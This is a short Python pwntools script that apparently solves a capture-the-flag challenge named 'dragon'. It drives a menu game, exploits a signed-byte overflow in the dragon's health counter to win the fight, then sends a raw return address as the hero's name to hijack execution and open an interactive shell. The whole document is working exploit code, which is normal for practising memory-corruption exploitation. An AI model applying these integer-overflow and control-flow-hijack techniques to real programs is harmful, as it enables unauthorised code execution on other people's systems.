from pwn import *

context.binary = elf = ELF("./dragon")
context.arch = "i386"


p = remote("0", 9004)

# deals with baby drago
p.recvuntil(b"Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight")
p.sendline(b"2")
sleep(0.5)
p.sendline(b"2")  # deals with baby dragon

p.recvuntil(b"Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight")
p.sendline(b"1")  # choose priest


# the health of the dragon is stored in a single singed byte. meaning that if that if the dragons health surpass 127 it becomes -128
# itll make the program think the dragon has minus health and let us win
p.sendline(b"3")
p.sendline(b"3")
p.sendline(b"2")

p.sendline(b"3")
p.sendline(b"3")
p.sendline(b"2")

p.sendline(b"3")
p.sendline(b"3")
p.sendline(b"2")

p.sendline(b"3")
p.sendline(b"3")
p.sendline(b"2")

p.recvuntil(b"The World Will Remember You As:") # oddly easy ROP
p.sendline(b"\xbf\x8d\x04\x08")

p.interactive()

#cat flag
